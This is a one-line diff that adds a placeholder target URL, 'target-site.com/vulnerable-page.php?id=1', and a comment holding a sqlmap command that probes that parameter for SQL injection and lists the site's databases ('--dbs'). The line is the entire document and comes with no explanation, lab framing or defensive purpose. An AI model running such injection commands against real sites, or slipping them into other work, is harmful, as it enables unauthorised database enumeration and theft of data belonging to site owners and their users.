@@ -1,0 +1,1 @@
+http://target-site.com/vulnerable-page.php?id=1 (GET)  # sqlmap.py -u http://target-site.com/vulnerable-page.php?id=1 --dbs
